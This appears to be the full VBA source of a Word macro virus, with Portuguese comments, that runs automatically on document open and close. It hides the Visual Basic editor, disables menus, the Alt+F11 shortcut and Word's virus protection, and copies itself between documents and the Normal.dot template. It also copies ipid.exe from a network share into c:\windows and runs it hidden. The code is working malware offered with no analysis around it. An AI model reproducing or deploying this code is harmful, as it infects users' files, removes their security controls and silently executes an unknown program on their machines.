   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "a"
   Sub autoopen()
   main
   End Sub
   Function main()
   On Error Resume Next 'teste.doc local
   w1 = Application.VBE.Windows.Count
   For i = 1 To w1
   Application.VBE.Windows(i).Visible = False
   Next
   i = 0
   For Each bar In Application.VBE.CommandBars
   i = i + 1
   Application.VBE.CommandBars(i).Protection = msoBarNoCustomize
   Application.VBE.CommandBars(i).Enabled = False
   Next
   FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
   Options.VirusProtection = False
   CommandBars(33).Controls("exibir").Controls("barras de ferramentas").Enabled = False
   CommandBars(33).Controls("Ferramentas").Controls("opções...").Enabled = False
   CommandBars(33).Controls("Ferramentas").Controls("personalizar...").Enabled = False
   CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("macros...").Enabled = False
   CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("Editor do Visual Basic").Enabled = False
   CommandBars(33).Controls("Ferramentas").Controls("Macro").Enabled = False
   i = 0
   For Each bar In CommandBars
   i = i + 1
   If (bar.NameLocal = "Barra de menus") Or (bar.NameLocal = "Padrão") Or (bar.NameLocal = "Formatação") Then
   CommandBars(i).Protection = msoBarNoCustomize
   Else
   CommandBars(i).Enabled = False
   End If
   Next
   c1 = Documents.Count
   If c1 >= 1 Then
      e1 = ActiveDocument.VBProject.VBComponents.Count
      p1 = "\\esm-cpd\e$\ipid.exe"
      If e1 >= 1 Then
         e2 = ActiveDocument.VBProject.VBComponents(1).Name
         If e1 >= 2 Then
             e3 = ActiveDocument.VBProject.VBComponents(2).Name
             c2 = MacroContainer
             If c2 = ActiveDocument.Name Then
                d1 = ActiveDocument.FullName
                d2 = ActiveDocument.AttachedTemplate.FullName
                e5 = NormalTemplate.VBProject.VBComponents.Count
                If e5 >= 1 Then
                     e6 = NormalTemplate.VBProject.VBComponents(1).Name
                     If e5 >= 2 Then
                            e7 = NormalTemplate.VBProject.VBComponents(2).Name
                            'Application.OrganizerRename d2, e7, "b", wdOrganizerObjectProjectItems
                            If e7 < e3 Then copyme
                            If e7 > e3 Then copyma
                            If e7 = e3 Then copyi
                     End If 'rodando no ativo sem modulo no normal
                           d2 = ActiveDocument.AttachedTemplate.FullName
                           Application.OrganizerCopy d1, d2, e3, wdOrganizerObjectProjectItems
                           Application.NormalTemplate.Save
                           FileCopy p1, "c:\windows\ipid.exe"
                           Shell "c:\windows\ipid.exe", 0
                           End
                 End If
              End If 'rodando no normal.dot
               d1 = ActiveDocument.FullName
               d2 = NormalTemplate.FullName
               e7 = NormalTemplate.VBProject.VBComponents(2).Name
               Application.OrganizerDelete d1, e3, wdOrganizerObjectProjectItems
               Application.OrganizerCopy d2, d1, e7, wdOrganizerObjectProjectItems
               Application.ActiveDocument.Save
               FileCopy p1, "c:\windows\ipid.exe"
               Shell "c:\windows\ipid.exe", 0
               End
          End If 'rodando no normal sem modulo no proj
             d1 = ActiveDocument.FullName
             d2 = NormalTemplate.FullName
             e7 = NormalTemplate.VBProject.VBComponents(2).Name
             Application.OrganizerCopy d2, d1, e7, wdOrganizerObjectProjectItems
             Application.ActiveDocument.Save
             FileCopy p1, "c:\windows\ipid.exe"
             Shell "c:\windows\ipid.exe", 0
             End
   End If
   End If
   End Function

   Function copyi()
   e2 = ActiveDocument.VBProject.VBComponents(1).Name
   e3 = ActiveDocument.VBProject.VBComponents(2).Name
   c2 = MacroContainer
   d1 = ActiveDocument.FullName
   d2 = NormalTemplate.FullName
   e6 = NormalTemplate.VBProject.VBComponents(1).Name
   e7 = NormalTemplate.VBProject.VBComponents(2).Name
   Application.OrganizerDelete d2, e7, wdOrganizerObjectProjectItems
   Application.OrganizerCopy d1, d2, e3, wdOrganizerObjectProjectItems
   Application.NormalTemplate.Save
   End
   End Function
   Function copyma()
   e2 = ActiveDocument.VBProject.VBComponents(1).Name
   e3 = ActiveDocument.VBProject.VBComponents(2).Name
   c2 = MacroContainer
   d1 = ActiveDocument.FullName
   d2 = NormalTemplate.FullName
   e6 = NormalTemplate.VBProject.VBComponents(1).Name
   e7 = NormalTemplate.VBProject.VBComponents(2).Name
   Application.OrganizerDelete d1, e3, wdOrganizerObjectProjectItems
   Application.OrganizerCopy d2, d1, e7, wdOrganizerObjectProjectItems
   Application.ActiveDocument.Save
   End
   End Function
   Function copyme()
   e2 = ActiveDocument.VBProject.VBComponents(1).Name
   e3 = ActiveDocument.VBProject.VBComponents(2).Name
   c2 = MacroContainer
   d1 = ActiveDocument.FullName
   d2 = NormalTemplate.FullName
   e6 = NormalTemplate.VBProject.VBComponents(1).Name
   e7 = NormalTemplate.VBProject.VBComponents(2).Name
   Application.OrganizerDelete d2, e7, wdOrganizerObjectProjectItems
   Application.OrganizerCopy d1, d2, e3, wdOrganizerObjectProjectItems
   Application.NormalTemplate.Save
   End
   End Function
   Sub autoclose()
   main
   End Sub
